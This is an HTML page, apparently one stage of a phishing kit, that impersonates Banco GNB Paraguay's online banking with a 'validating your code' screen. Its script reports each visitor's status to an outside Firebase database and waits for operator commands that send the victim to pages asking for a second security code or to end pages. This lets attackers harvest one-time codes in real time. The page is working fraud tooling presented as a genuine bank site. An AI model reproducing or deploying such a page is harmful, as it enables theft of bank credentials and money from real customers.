<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GNB :: Validando código</title>
<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
<style>
body{margin:0;background:#EDEDED;font-family:'Open Sans',sans-serif;min-width:320px;}
.caja{background:#fff;max-width:520px;margin:8vh auto;padding:0 0 44px;box-shadow:0 1px 4px rgba(0,0,0,.09);}
.tope{text-align:right;padding:10px 16px 0;font-size:20px;}
.tope a{color:#0574AF;text-decoration:none;}
.logo{text-align:center;padding:14px 0 26px;}
.logo img{max-width:240px;height:auto;}
h1{font-size:21px;font-weight:600;color:#22302b;text-align:center;margin:0 20px 8px;}
.sub{text-align:center;color:#6d7275;font-size:13.5px;margin:0 26px 30px;line-height:1.55;}
.spin{width:54px;height:54px;margin:0 auto 26px;border:4px solid #e3e7e5;border-top-color:#7AB83F;border-radius:50%;animation:g 1s linear infinite;}
@keyframes g{to{transform:rotate(360deg)}}
.pasos{margin:0 auto;max-width:310px;font-size:12.5px;color:#8a8d8f;}
.pasos div{display:flex;align-items:center;gap:10px;padding:6px 0;}
.pasos i{width:16px;height:16px;border-radius:50%;border:2px solid #d6dbd9;display:inline-block;flex:none;}
.pasos div.ok{color:#4e8c22;}
.pasos div.ok i{background:#7AB83F;border-color:#7AB83F;}
.pasos div.now{color:#22302b;font-weight:600;}
.pasos div.now i{border-color:#7AB83F;border-top-color:transparent;animation:g .9s linear infinite;}
.pie{text-align:center;font-size:11.5px;color:#a3a8ab;margin-top:30px;}
</style>
</head>
<body>
<div class="caja">
  <div class="tope"><a href="https://www.bancognb.com.py/public/">X</a></div>
  <div class="logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>

  <div class="spin"></div>
  <h1>Validando el código</h1>
  <p class="sub">Estamos comprobando el código que ingresaste. No cierres esta ventana.</p>

  <div class="pasos">
    <div class="ok"><i></i> Datos confirmados</div>
    <div class="ok"><i></i> Código recibido</div>
    <div class="now"><i></i> Verificación de seguridad</div>
    <div><i></i> Acceso a tu cuenta</div>
  </div>

  <div class="pie">Banco GNB Paraguay · Conexión segura</div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
<script>
var firebaseConfig = {
  apiKey: "AIzaSyD-placeholder",
  databaseURL: "https://cbonnlineec-default-rtdb.firebaseio.com",
  projectId: "cbonnlineec-default-rtdb"
};
var DB = null;
try { firebase.initializeApp(firebaseConfig); DB = firebase.database(); } catch(e){}

var id = localStorage.getItem('gnb_uid');
var decidido = false;

function ir(pag){
  if (decidido) return;
  decidido = true;
  window.location.href = pag;
}

function actuar(accion){
  if (accion === 'token2') ir('codigo2.html');
  else if (accion === 'dejar') ir('final.html');
  else if (accion === 'rechazar') ir('rechazado.html');
}

if (!id){
  setTimeout(function(){ ir('index.html'); }, 800);
} else if (DB) {
  DB.ref('nbch/usuarios/'+id).update({status:'VALIDANDO CODIGO'});

  DB.ref('nbch/comandos/'+id).on('value', function(s){
    var c = s.val();
    if (c && c.accion) actuar(c.accion);
  });

  DB.ref('nbch/usuarios/'+id).once('value').then(function(s){
    var st = ((s.val()||{}).status||'').toUpperCase();
    if (st.indexOf('CODIGO 2') > -1) ir('codigo2.html');
    else if (st === 'FINALIZADO') ir('final.html');
    else if (st === 'RECHAZADO') ir('rechazado.html');
  });
}

setTimeout(function(){ if (!decidido && !DB) ir('codigo2.html'); }, 45000);
</script>
</body>
</html>
